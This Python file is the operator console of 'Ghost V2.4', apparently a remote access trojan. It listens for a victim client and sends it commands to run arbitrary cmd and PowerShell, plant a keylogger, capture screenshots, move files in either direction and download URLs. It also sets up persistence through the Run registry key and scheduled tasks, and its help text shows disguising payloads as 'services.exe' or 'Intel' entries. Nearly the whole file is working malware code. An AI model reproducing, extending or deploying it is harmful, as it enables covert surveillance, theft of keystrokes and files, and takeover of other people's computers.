############################################################################
#
#   master.py (Management Console) [ Main Program ]
#   © 2022 ABDULKADİR GÜNGÖR All Rights Reserved
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	04/2022
#	All Rights Reserved (Tüm Hakları Saklıdır)
#
############################################################################
from  ghostlib_win32socket import Win32Socket
from  ghostlib_win32crypto import Win32Crypto
from  ghostlib_win32functions import f14_check_file, f14_file_read, f14_file_write, f16_screenshot_save, f16_screenshot_show
import sys, os

#
class Settings:
    CRTYPTO_KEY     =  b'A45iPxLo908RYe3Wq034TueWvCxz3618'      # 32 bit(s)
    CRTYPTO_NUMBER  =  71                                       # 0 < x < 128
    SOCKET_PROTOCOL = "UDP"                                     # "TCP" or "UDP"
    SOCKET_HOST     = "0.0.0.0"
    SOCKET_PORT     = 9292
    SYSTEM_ENCODE   = "cp857"                                   # TURKISH CHARACTER SET
    SYSTEM_DEFAULTTIMEOUT = 0                                   #

#
def byte_to_str(res):
    try:
        res_str = bytes.decode(res, "UTF-8", "backslashreplace")
    except:
        res_str = "Error!"
    return res_str

#
def screen_clear():
    if os.name=='nt':
        os.system('cls')
    elif os.name=='posix':
        os.system('clear')
    print("\n")

#
def screen():
    screen_clear()
    print()
    print('\t#####################################################')
    print('\t#/*************************************************\#')
    print('\t#**||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~||**#')
    print('\t#**||                                           ||**#')
    print('\t#**||              Ghost V2.4                   ||**#')
    print('\t#**||                04/2021                    ||**#')
    print('\t#**||                                           ||**#')
    print('\t#**||       Developer: Abdulkadir GÜNGÖR        ||**#')
    print('\t#**||       (abdulkadir_gungor@outlook.com)     ||**#')
    print('\t#**||                                           ||**#')
    print('\t#**||~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~||**#')
    print('\t#\*************************************************/#')
    print('\t#####################################################')
    print()
    print()
#
def help():
    screen_clear()
    #
    print("\tCommands")
    print("\t"+("-"*40))
    print("\t[1]   (command)>>hide")
    print("\t[2]   (command)>>show")
    print("\t[3]   (command)>>msg message")
    print("\t[4]   (command)>>getcd")
    print("\t[5]   (command)>>setcd path")
    print("\t[6]   (command)>>dir")
    print("\t[7]   (command)>>dir path")
    print("\t[8]   (command)>>rename_file old_file_name new_file_name")
    print("\t[9]   (command)>>move_file old_file_path new_file_path")
    print("\t[10]  (command)>>delete_file filename")
    print("\t[11]  (command)>>create_directory directory_name")
    print("\t[12]  (command)>>rename_directory old_directory_name new_directory_name")
    print("\t[13]  (command)>>delete_directory directory")
    print("\t[14]  (command)>>zip_create_file zip_file_name file")
    print("\t[15]  (command)>>zip_create_directory zip_file_name directory")
    print("\t[16]  (command)>>zip_extract zip_file")
    print("\t[17]  (command)>>zip_extract zip_file path")
    print("\t[18]  (command)>>cmd cmd_commands")
    print("\t[19]  (command)>>powershell powershell_commands")
    print("\t[20]  (command)>>systeminfo")
    print("\t[21]  (command)>>start program")
    print("\t[22]  (command)>>repeat_start second program")
    print("\t[23]  (command)>>keylogger program_name")
    print("\t[24]  (command)>>screenshot")
    print("\t[25]  (command)>>screenshot_save file_name.png")
    print("\t[26]  (command)>>url_download url filename")
    print("\t[27]  (command)>>upload local_file remote_file")
    print("\t[28]  (command)>>download local_file remote_file")
    print("\t[29]  (command)>>regedit_startup regedit_name program program_path")
    print("\t[30]  (command)>>regedit_delete regedit_name")
    print("\t[31]  (command)>>create_sctasks_minute taskname program minute")
    print("\t[32]  (command)>>create_sctasks_hourly taskname program hour")
    print("\t[33]  (command)>>create_sctasks_daily taskname program time")
    print("\t[34]  (command)>>create_sctasks_once taskname program time")
    print("\t[35]  (command)>>disable_sctasks taskname ")
    print("\t[36]  (command)>>delete_sctasks taskname ")
    print("\t[37]  (command)>>help")
    print("\t[38]  (command)>>commands")
    print("\t[39]  (command)>>clear")
    print("\t[40]  (command)>>exit")
    #
    print("\n")
    print("\n")
#
def detailed_help():
    screen_clear()
    #
    print("\tCommands")
    print("\t"+("-"*40))
    print("\t(1) hide     ")
    print('''\tHides console on remote computer but won't work if compiled with "--noconsole" parameter''')
    print("\t(command)>>hide")
    print("\t")
    print("\t(2) show  ")
    print('''\tShows console on remote computer but won't work if compiled with "--noconsole" parameter''')
    print("\t(command)>>show")
    print("\t")
    print("\t(3) msg      ")
    print('''\tShows message on remote computer but won't work if compiled with "--noconsole" parameter''')
    print("\t(command)>>msg message")
    print("\t(example)>>msg Who are you?")
    print("\t")
    print("\t(4) getcd")
    print("\tShows working folder on remote computer")
    print("\t(command)>>getcd")
    print("\t")
    print("\t(5) setcd")
    print("\tSets working folder on remote computer")
    print("\t(command)>>setcd path")
    print("\t(example)>>setcd  C:\\Users")
    print("\t")
    print("\t(6) dir")
    print("\tShows files and folders on remote computer")
    print("\t(command)>>dir")
    print("\t(command)>>dir path")
    print("\t(example)>>dir  C:\\Users")
    print("\t")
    print("\t(7) rename_file")
    print("\tRenames files on remote computer")
    print("\t(command)>>rename_file old_file_name new_file_name")
    print("\t(example)>>rename keylogger.exe services.exe")
    print("\t")
    print("\t(8) move_file")
    print("\tMoves files on remote computer")
    print("\t(command)>>move_file old_file_path new_file_path")
    print("\t(example)>>move_file C:\\services.exe C:\\Users\\services.exe")
    print("\t")
    print("\t(9) delete_file")
    print("\tDeletes files on remote computer")
    print("\t(command)>>delete_file filename")
    print("\t(example)>>delete_file Services.exe")
    print("\t(example)>>delete_file C:\\Users\\services.exe")
    print("\t")
    print("\t(10) create_directory")
    print("\tCreates directory on remote computer")
    print("\t(command)>>create_directory directory_name")
    print("\t(example)>>create_directory test_directory")
    print("\t")
    print("\t(11) rename_directory")
    print("\tRenames directory on remote computer")
    print("\t(command)>>rename_directory old_directory_name new_directory_name")
    print("\t(example)>>rename_directory old_name new_name")
    print("\t")
    print("\t(12) delete_directory")
    print("\tDeletes directory on remote computer")
    print("\t(command)>>delete_directory directory")
    print("\t(example)>>delete_directory test")
    print("\t")
    print("\t(13) zip_create_file")
    print("\tCompresses a single file with zip on remote computer")
    print("\t(command)>>zip_create_file zip_file_name file")
    print("\t(example)>>zip_create_file test.zip test.docx")
    print("\t")
    print("\t(14) zip_create_directory")
    print("\tCompresses the folder and the files in it with zip on remote computer")
    print("\t(command)>>zip_create_directory zip_file_name directory")
    print("\t(example)>>zip_create_directory test.zip test")
    print("\t")
    print("\t(15) zip_extract")
    print("\tExtracts the zip file on remote computer")
    print("\t(command)>>zip_extract zip_file")
    print("\t(command)>>zip_extract zip_file path")
    print("\t(example)>>zip_extract test.zip")
    print("\t(example)>>zip_extract test.zip C:\\Users\\..\\temp")
    print("\t")
    print("\t(16) cmd")
    print("\tRuns cmd commands on remote computer")
    print("\t(command)>>cmd cmd_commands")
    print("\t(example)>>cmd whoami")
    print("\t")
    print("\t(17) powershell")
    print("\tRuns powershell commands on remote computer")
    print("\t(command)>>powershell powershell_commands")
    print("\t(example)>>powershell whoami")
    print("\t")
    print("\t(18) systeminfo")
    print("\tShows system information about remote computer")
    print("\t(command)>>systeminfo")
    print("\t")
    print("\t(19) start")
    print("\tStarts program on remote computer")
    print("\t(command)>>start program")
    print("\t(example)>>start test.exe")
    print("\t(example)>>start C:\\Users\\Windows\\System32\\calc.exe")
    print("\t")
    print("\t(20) repeat_start")
    print("\tReruns the program on remote computer according to a certain period")
    print("\t(command)>>repeat_start second program")
    print("\t(example)>>repeat_start 60 test.exe")
    print("\t(example)>>repeat_start 300 C:\\Users\\Windows\\System32\\calc.exe")
    print("\t")
    print("\t(21) keylogger")
    print("\tCreates keylogger program on remote computer")
    print("\tThis keylogger program has not persistent attribute")
    print("\tYou can use other commands for this (regedit_startup, etc.)")
    print("\t(command)>>keylogger program_name")
    print("\t(example)>>keylogger service.exe")
    print("\t")
    print("\t(22) screenshot")
    print("\tTakes a screenshot on remote computer and displays it on local computer")
    print("\t(command)>>screenshot")
    print("\t")
    print("\t(23) screenshot_save")
    print("\tTakes a screenshot on remote computer and saves it on local computer")
    print("\t(command)>>screenshot_save file_name.png")
    print("\t(example)>>screenshot_save 1.png")
    print("\t")
    print("\t(24) url_download")
    print("\tDownloads files to remote computer from the Internet ")
    print("\t(command)>>url_download url filename")
    print("\t(example)>>url_download https:\\test.com\\r.zip test.zip")
    print("\t")
    print("\t(25) upload")
    print("\tUploads files to remote computer from local computer")
    print("\t(command)>>upload local_file remote_file")
    print("\t(example)>>upload local.zip remote.zip")
    print("\t(example)>>upload C:\\Users\\..\\local.zip C:\\Users\\..\\remote.zip")
    print("\t")
    print("\t(26) download")
    print("\tDownloads files to local computer from remote computer")
    print("\t(command)>>download local_file remote_file")
    print("\t(example)>>download local.zip remote.zip")
    print("\t(example)>>download C:\\Users\\..\\local.zip C:\\Users\\..\\remote.zip")
    print("\t")
    print("\t(27) regedit_startup")
    print("\tIt saves regedit for the application that will run when the computer is turned on.")
    print('\tIt saves the key value in the regedit path ("Software\Microsoft\Windows\CurrentVersion\Run") ')
    print("\t(command)>>regedit_startup regedit_name program program_path")
    print("\t(example)>>regedit_startup Intel intelsupport.exe C:\\Windows\\System32")
    print("\t")
    print("\t(28) regedit_delete")
    print('\tDeletes the value created with the "regedit startup" command')
    print("\t(command)>>regedit_delete regedit_name")
    print("\t(example)>>regedit_delete Intel")
    print("\t")
    print("\t(29) create_sctasks_minute")
    print('\tSets the task scheduler for the program to run at intervals of a certain number of minutes.')
    print("\t(command)>>create_sctasks_minute taskname program minute")
    print("\t(example)>>create_sctasks_minute Intel C:\\Windows\\System32\\test.exe 10")
    print("\ttest.exe will run every 10 minutes")
    print("\t")
    print("\t(30) create_sctasks_hourly")
    print('\tSets the task scheduler for the program to run at intervals of a certain number of hour.')
    print("\t(command)>>create_sctasks_hourly taskname program hour")
    print("\t(example)>>create_sctasks_hourly Intel C:\\Windows\\System32\\test.exe 1")
    print("\ttest.exe will run every 1 hour")
    print("\t")
    print("\t(31) create_sctasks_daily")
    print('\tSets the task scheduler for the program to run once a day at a certain time.')
    print("\t(command)>>create_sctasks_daily taskname program time")
    print("\t(example)>>create_sctasks_daily Intel C:\\Windows\\System32\\test.exe 02:02")
    print("\ttest.exe will run 02:02 once a day")
    print("\t")
    print("\t(32) create_sctasks_once")
    print('\tSets the task scheduler for the program to run only once at time ')
    print("\t(command)>>create_sctasks_once taskname program time")
    print("\t(example)>>create_sctasks_once Intel C:\\Windows\\System32\\test.exe 02:02")
    print("\ttest.exe will run only once at 02:02")
    print("\t")
    print("\t(33) disable_sctasks")
    print('\tDisables the task scheduler saved in task manager')
    print("\t(command)>>disable_sctasks taskname ")
    print("\t(example)>>disable_sctasks Intel ")
    print("\t")
    print("\t(34) delete_sctasks")
    print('\tDeletes the task scheduler saved in task manager')
    print("\t(command)>>delete_sctasks taskname ")
    print("\t(example)>>delete_sctasks Intel ")
    #
    print("\t")
    print("\t(*) help")
    print("\tShows commands in detail")
    print("\t(command)>>help")
    print("\t")
    print("\t(**) commands")
    print("\tShows commands briefly")
    print("\t(command)>>commands")
    print("\t")
    print("\t(****) clear")
    print("\tClears the screen")
    print("\t(command)>>clear")
    print("\t")
    print("\t(*****) exit")
    print("\tTerminates the server and client running.")
    print("\t(command)>>exit")
    print("\n")
    print("\n")
#
#
def arg():
    argv = sys.argv
    number = len(argv)
    #
    try:
        for ii in range(number):
            if ii != 0:
                if argv[ii].lower() == "-h" or argv[ii].lower() == "-help" :
                    raise TypeError("Help error!")
                elif argv[ii].lower() == "-udp":
                    Settings.SOCKET_PROTOCOL = "UDP"
                elif argv[ii].lower() == "-tcp":
                    Settings.SOCKET_PROTOCOL = "TCP"
                elif len(argv[ii]) > 4 and argv[ii][0:3].lower() == "-t:":
                    Settings.SYSTEM_DEFAULTTIMEOUT = int(argv[ii][3:])
                elif len(argv[ii]) > 4 and argv[ii][0:3].lower() == "-c:":
                    Settings.SYSTEM_ENCODE = argv[ii][3:]
                else:
                        Settings.SOCKET_PORT = int(argv[ii])
    except:
        print()
        print("\t\t Argument(s) ")
        print("\t-------------------------------")
        print("\tProtocol argument: -udp/-tcp  ")
        print("\tTimeout  argument: -t:00 ")
        print("\tSystem encode: -c:cp857")
        print("\tPort         :  8010")
        print()
        print()
        print("\t(Examples)")
        print("\t{} 8989 -udp -c:utf-8 -t:30 ".format(argv[00]))
        print("\t{} -tcp -c:cp857  7070".format(argv[00]))
        print("\t{} 4949 ".format(argv[00]))
        print()
        sys.exit(0)

#
def command(cmd, s):
    res = b'00'
    order = cmd.strip()
    #
    try:
        if len(order)>=4 and order[0:4].lower() == 'exit' :
            res = b'Exit'
        elif len(order)>=4 and order[0:4].lower() == 'hide':
            res = b'01:'
        elif len(order)>=4 and order[0:4].lower() == 'show':
            res = b'02:'
        elif len(order)>=3 and order[0:3].lower() == 'msg':
            res = b'03:' + cmd[4:].encode("UTF-8", "backslashreplace")
        elif len(order)>=9 and order[0:9].lower() == 'keylogger':
            res = b'04:' + cmd[10:].encode("UTF-8", "backslashreplace")
        elif len(order)>=5 and order[0:5].lower() == 'start':
            res = b'05:' + (cmd[5:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=12 and order[0:12].lower() == 'url_download':
            res = b'06:' + (cmd[12:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=3 and order[0:3].lower() == 'cmd':
            res = b'07:' + (cmd[3:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=10 and order[0:10].lower() == 'powershell':
            res = b'08:' + (cmd[10:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=10 and order[0:10].lower() == 'systeminfo':
            res = b'09:'
        elif len(order)>=5 and order[0:5].lower() == 'getcd':
            res = b'10:'
        elif len(order)>=5 and order[0:5].lower() == 'setcd':
            res = b'11:' + (cmd[5:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=15 and order[0:15].lower() == 'zip_create_file':
            res = b'12:' + (cmd[15:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=20 and order[0:20].lower() == 'zip_create_directory':
            res = b'13:' + (cmd[20:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=11 and order[0:11].lower() == 'zip_extract':
            res = b'14:' + (cmd[11:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=3 and order[0:3].lower() == 'dir':
            res = b'15:' + (cmd[3:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=3 and order[0:3].lower() == 'dir':
            res = b'15:' + (cmd[3:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=11 and order[0:11].lower() == 'rename_file':
            res = b'16:' + (cmd[11:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=9 and order[0:9].lower() == 'move_file':
            res = b'17:' + (cmd[9:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=11 and order[0:11].lower() == 'delete_file':
            res = b'18:' + (cmd[11:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=16 and order[0:16].lower() == 'rename_directory':
            res = b'19:' + (cmd[16:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=16 and order[0:16].lower() == 'create_directory':
            res = b'20:' + (cmd[16:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=16 and order[0:16].lower() == 'delete_directory':
            res = b'21:' + (cmd[16:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=12 and order[0:12].lower() == 'repeat_start':
            res = b'22:' + (cmd[12:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=15 and order[0:15].lower() == 'regedit_startup':
            res = b'23:' + (cmd[15:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=14 and order[0:14].lower() == 'regedit_delete':
            res = b'24:' + (cmd[14:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=21 and order[0:21].lower() == 'create_sctasks_minute':
            res = b'25:' + (cmd[21:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=21 and order[0:21].lower() == 'create_sctasks_hourly':
            res = b'26:' + (cmd[21:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=20 and order[0:20].lower() == 'create_sctasks_daily':
            res = b'27:' + (cmd[20:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=19 and order[0:19].lower() == 'create_sctasks_once':
            res = b'28:' + (cmd[19:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=15 and order[0:15].lower() == 'disable_sctasks':
            res = b'29:' + (cmd[15:].strip()).encode("UTF-8", "backslashreplace")
        elif len(order)>=14 and order[0:14].lower() == 'delete_sctasks':
            res = b'30:' + (cmd[14:].strip()).encode("UTF-8", "backslashreplace")
        #
        elif len(order) >= 8 and order[0:8].lower() == 'download':
            tmp = (cmd[8:].strip()).split(sep=' ')
            file = tmp[0]
            download = tmp[1]
            #
            res = b'31:' + download.encode("UTF-8", "backslashreplace")
            #
            s.send(res)
            dd = s.send(res)
            #
            if len(dd) >= 3 and dd[0:3] == b'70:':
                data = (bytes.decode(dd[3:],"UTF-8", "backslashreplace")).split(sep=' ')
                filename = data[0]
                size = data[1]
                md5 = data[2]
                sha1 = data[3]
                sha258 = data[4]
                sha512 = data[5]
                #
                print("\nRemote Filename : ", filename)
                print("Size            : ", size, " byte(s)")
                print("Md5             : ", md5)
                print("Sha1            : ", sha1)
                print("Sha258          : ", sha258)
                print("Sha512          : ", sha512)
                #
                turn = True
                while turn:
                    s.send(res)
                    dd = s.send(res)
                    if dd[0:3] == b'72:':
                        f14_file_write(file, dd[3:])
                    else:
                        if dd[0:3] == b'71:':
                            s.send(dd)
                            s.send(b"\tOK!...")
                        turn = False
                #
                notError, filename,  size , md5 , sha1, sha258, sha512 = f14_check_file(file)
                if notError:
                    #
                    print("\nLocal Filename : ", filename)
                    print("Size           : ", size, " byte(s)")
                    print("Md5            : ", md5)
                    print("Sha1           : ", sha1)
                    print("Sha258         : ", sha258)
                    print("Sha512         : ", sha512)
                    print("\n")
            #
            res = b'99:'
        #
        elif len(order) >= 6 and order[0:6].lower() == 'upload':
            tmp = (cmd[6:].strip()).split(sep=' ')
            file = tmp[0]
            upload = tmp[1]
            #
            notError, filename, size, md5, sha1, sha258, sha512 = f14_check_file(file)
            if notError:
                #
                print("\nLocal Filename : ", filename)
                print("Size           : ", size, " byte(s)")
                print("Md5            : ", md5)
                print("Sha1           : ", sha1)
                print("Sha258         : ", sha258)
                print("Sha512         : ", sha512)
                #
                res = b'32:' + upload.encode("UTF-8", "backslashreplace")
                s.send(res)
                s.send(b"\tOK!...")
                #
                turn = True
                offset = 0
                while turn:
                    x1, offset, tmp_data = f14_file_read(file, offset)
                    if x1:
                        dd = b'72:' + tmp_data
                        s.send(dd)
                        s.send(b"\tOK!...")
                    else:
                        dd = b'71:'
                        s.send(dd)
                        s.send(b"\tOK!...")
                        turn = False
                #
                s.send(res)
                tt = s.send(b"\tOK!...")
                #
                data = (bytes.decode(tt[3:], "UTF-8", "backslashreplace")).split(sep=' ')
                #
                filename = data[0].strip()
                size     = data[1].strip()
                md5      = data[2].strip()
                sha1     = data[3].strip()
                sha258   = data[4].strip()
                sha512   = data[5].strip()
                #
                print("\nRemote Filename : ", filename)
                print("Size            : ", size, " byte(s)")
                print("Md5             : ", md5)
                print("Sha1            : ", sha1)
                print("Sha258          : ", sha258)
                print("Sha512          : ", sha512)
                print("\n")
            #
            res = b'99:'
            #
        #
        elif len(order) >= 15 and order[0:15].lower() == 'screenshot_save':
            file = order[15:].strip()
            #
            data = b''
            res = b'34:'
            #
            turn = True
            while turn:
                s.send(res)
                dd = s.send(b"\tOK!...")
                if dd[0:3] == b'72:':
                    data += dd[3:]
                else:
                    if dd[0:3] == b'71:':
                        s.send(dd)
                        s.send(b"\tOK!...")
                    turn = False
            #
            #
            if data != b'':
                f16_screenshot_save(data,file)
            #
            #
            res = b'99:'
        #
        elif len(order) >= 10 and order[0:10].lower() == 'screenshot':
            #
            data = b''
            res = b'33:'
            #
            turn = True
            while turn:
                s.send(res)
                dd = s.send(b"\tOK!...")
                if dd[0:3] == b'72:':
                    data += dd[3:]
                else:
                    if dd[0:3] == b'71:':
                        s.send(dd)
                        s.send(b"\tOK!...")
                    turn = False
            #
            #
            if data != b'':
                f16_screenshot_show(data)
            #
            #
            res = b'99:'
    #
    except:
        pass
    #
    return  res
#
#
#
if __name__ == '__main__':
    arg()
    #
    password = Win32Crypto(key=Settings.CRTYPTO_KEY, number=Settings.CRTYPTO_NUMBER)
    s = Win32Socket(win32crypto=password, protocol=Settings.SOCKET_PROTOCOL, host=Settings.SOCKET_HOST, port=Settings.SOCKET_PORT)
    #
    #
    screen()
    while True:
        print("Waiting for connection...")
        print("Protocol: "+ Settings.SOCKET_PROTOCOL.lower() )
        s.start(settimeout=Settings.SYSTEM_DEFAULTTIMEOUT)
        #
        #
        print("Host: "+s.receive_addr)
        print("Port: "+str(s.receive_port))
        print("\n\n")
        #
        while True:
            cmd_str  = input("\t<Client command> : ")
            if cmd_str.strip().lower() == "help":
                detailed_help()
                continue
            elif cmd_str.strip().lower() == "commands":
                help()
                continue
            elif cmd_str.strip().lower() == "clear":
                screen_clear()
            else:
                cmd_bytes = command(cmd_str, s)
                #
                #
                res = s.send( cmd_bytes )

                if res==b' ' or s.connection == False or s.iserror:
                    print("\tConnection lost!\n\n\n")
                    break
                else:
                    if cmd_bytes != b'99:':
                        print( byte_to_str(res) )
                #
                #
                res1 = s.send(b"Continue")
                if res1==b' ' or s.connection == False or s.iserror:
                    print("\tConnection lost!\n\n\n")
                    break
                #
                #
                if cmd_bytes == b'Exit':
                   s.close()
                   sys.exit(0)
                #
                #
                print( "\n")
                print(("-"*50))
                print( byte_to_str(res1) )
                print( ("-"*50),"\n","\n")
                print()